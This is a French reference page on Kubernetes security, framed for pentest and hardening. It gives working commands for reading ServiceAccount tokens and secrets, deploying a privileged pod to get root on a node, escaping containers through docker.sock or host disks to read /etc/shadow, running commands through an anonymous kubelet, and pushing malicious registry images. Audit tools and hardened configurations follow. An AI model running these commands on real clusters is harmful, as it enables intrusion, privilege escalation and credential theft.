---
title: Kubernetes Security
domain: sciences-appliquées
subdomain: informatique / sécurité / cloud
tags: [kubernetes, k8s, conteneur, rbac, sécurité, cloud, pentest]
date: 2026-03-22
---

# Kubernetes Security

Kubernetes (K8s) orchestre des conteneurs à grande échelle. Sa complexité et ses configurations par défaut peu sécurisées en font une cible de choix.

## Architecture et surface d'attaque

```
Composants d'un cluster K8s :

Control Plane :
  kube-apiserver  (port 6443/8080) → Point d'entrée de toutes les opérations
  etcd            (port 2379-2380) → Base de données du cluster (secrets, configs)
  kube-scheduler  → Planifie les pods sur les noeuds
  kube-controller → Boucle de contrôle (états désirés)

Worker Nodes :
  kubelet         (port 10250/10255) → Agent sur chaque noeud
  kube-proxy      → Routing réseau entre services
  Container Runtime (Docker, containerd, CRI-O)

Ressources :
  Pod             → Unité de base (un ou plusieurs conteneurs)
  Service         → Endpoint réseau stable pour un groupe de pods
  Namespace       → Isolation logique des ressources
  Secret          → Données sensibles (mots de passe, tokens, clés)
  ConfigMap       → Configuration non sensible
  ServiceAccount  → Identité K8s pour les pods
  RBAC (Role, ClusterRole, RoleBinding, ClusterRoleBinding)
```

## Reconnaissance

```bash
# Depuis l'extérieur — scanner les ports K8s
nmap -p 6443,8080,10250,10255,2379,2380 target.com

# API server non authentifié (8080 — rare en production mais existant)
curl http://target.com:8080/api/v1/namespaces
curl http://target.com:8080/api/v1/secrets

# API server avec token volé
kubectl --server=https://target.com:6443 --token=<token> get pods -A
kubectl --server=https://target.com:6443 --token=<token> get secrets -A

# Depuis l'intérieur d'un pod compromis
# Le token du ServiceAccount est monté automatiquement
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/default/pods

# Vérifier ses propres droits (auth can-i)
kubectl auth can-i --list                     # Tout ce qu'on peut faire
kubectl auth can-i get secrets                # Peut-on lire les secrets ?
kubectl auth can-i create pods                # Créer des pods ?
kubectl auth can-i "*" "*"                    # Droits complets ?
```

## Exploitation des mauvaises configurations RBAC

### Trop de droits sur les ressources

```bash
# Si le ServiceAccount peut lire les secrets
kubectl get secrets -A -o json | jq '.items[].data'

# Décoder un secret Base64
kubectl get secret db-password -o jsonpath='{.data.password}' | base64 -d

# Si le SA peut lister les pods et exec
kubectl exec -it <pod-name> -- /bin/bash   # Shell dans un autre pod

# Si le SA peut créer des pods → escalade vers le noeud
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  hostPID: true           # Partage le PID namespace du noeud
  hostNetwork: true       # Partage le réseau du noeud
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    volumeMounts:
    - mountPath: /host
      name: node-root
    securityContext:
      privileged: true    # Conteneur privilégié
  volumes:
  - name: node-root
    hostPath:
      path: /
EOF

kubectl exec -it attacker-pod -- /bin/sh
# → Accès root au noeud via chroot /host
```

### Rôles dangereux courants

```yaml
# ClusterRole trop permissif — donne accès à tout
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# Wildcard verb sur les pods → peut créer des pods privilégiés → escape vers le noeud
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["*"]

# Accès aux secrets → tous les mots de passe du cluster
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
```

## Container Escape

### Conteneur privilégié

```bash
# Si le conteneur s'exécute avec --privileged ou securityContext.privileged=true
# → Accès aux devices du noeud

# Depuis le conteneur privilégié
fdisk -l                              # Voir les disques du noeud
mount /dev/sda1 /mnt                  # Monter le disque du noeud
chroot /mnt /bin/bash                 # Shell root sur le noeud
cat /mnt/etc/shadow                   # Hashes root du noeud
```

### hostPath monté

```bash
# Si /proc du noeud est monté dans le conteneur
ls /host-proc/1/root/                 # Accès au filesystem du noeud via /proc/1

# Si le socket Docker est monté (docker.sock)
ls /var/run/docker.sock
docker ps                             # Contrôle du daemon Docker du noeud
docker run -v /:/hostfs alpine chroot /hostfs /bin/sh  # Shell root sur le noeud
```

### Abus du kubelet (port 10250)

```bash
# kubelet avec authentification anonyme activée
curl -sk https://node-ip:10250/pods  # Liste tous les pods sur le noeud

# Exécuter une commande dans un pod via kubelet (sans authentification)
curl -sk https://node-ip:10250/run/<namespace>/<pod>/<container> \
    -d "cmd=id"
```

## Exfiltration depuis un pod

```bash
# Token du ServiceAccount → accès à l'API K8s
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Variables d'environnement → credentials souvent stockés là
env | grep -i "password\|secret\|key\|token\|api"

# ConfigMaps montés
ls /etc/config/
cat /etc/config/application.properties

# Secrets montés comme volumes
ls /etc/secrets/
cat /etc/secrets/db-password

# Réseau interne — scanner les services accessibles
# (depuis dans le pod, le réseau du cluster est accessible)
curl http://kubernetes.default.svc/api/v1/  # API server
curl http://etcd:2379/v2/keys               # etcd (si accessible)
```

## Attaque de la chaîne de supply chain

```bash
# Imposteur de images (si le registre n'est pas authentifié)
# Pousser une image malveillante dans le registre interne
docker tag malicious-app internal-registry.company.com/app:latest
docker push internal-registry.company.com/app:latest
# Si un pod redéploie avec cette image → code malveillant exécuté dans le cluster

# Vérifier les images utilisées et leurs vulnérabilités
trivy image nginx:latest                # Scanner une image
trivy k8s --report summary cluster      # Scanner tout le cluster
```

## Outils d'audit K8s

```bash
# kube-bench — vérifier la conformité CIS Kubernetes Benchmark
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job.kube-bench

# kubeaudit — audit de sécurité du cluster
kubeaudit all                           # Toutes les vérifications
kubeaudit privileged                    # Conteneurs privilégiés
kubeaudit capabilities                  # Capabilities Linux

# kubectl-who-can — qui peut faire quoi
kubectl who-can create pods             # Qui peut créer des pods ?
kubectl who-can get secrets             # Qui peut lire les secrets ?

# Trivy (Aqua Security) — scanner de vulnérabilités
trivy k8s --report summary cluster

# Falco — détection d'intrusion en temps réel (eBPF)
# Règles comme "shell spawned in container", "sensitive file read"
```

## Configurations sécurisées

```yaml
# PodSecurityContext sécurisé
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]      # Supprimer toutes les capabilities Linux
```

```yaml
# NetworkPolicy — isolation réseau entre namespaces
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  podSelector: {}          # S'applique à tous les pods
  policyTypes:
  - Ingress
  - Egress
  ingress: []              # Aucun trafic entrant autorisé par défaut
  egress: []               # Aucun trafic sortant autorisé par défaut
```

```yaml
# RBAC minimal — least privilege
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: production
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get"]           # Seulement lire, seulement les configmaps
# Ne JAMAIS accorder secrets/*, pods/exec, ou verbs: ["*"]
```

```
Checklist Kubernetes :
✓ RBAC avec least privilege — pas de wildcards
✓ Pas de ServiceAccount token auto-monté si non nécessaire
✓ Network Policies pour isoler les namespaces
✓ Pod Security Standards (Restricted) sur les namespaces production
✓ Secrets chiffrés dans etcd (EncryptionConfiguration)
✓ Audit logs de l'API server activés
✓ Images scannées avant déploiement (Trivy, Snyk)
✓ Falco pour la détection comportementale à l'exécution
✓ Pas d'accès anonyme au kubelet (--anonymous-auth=false)
✓ API server non exposé sur Internet
```
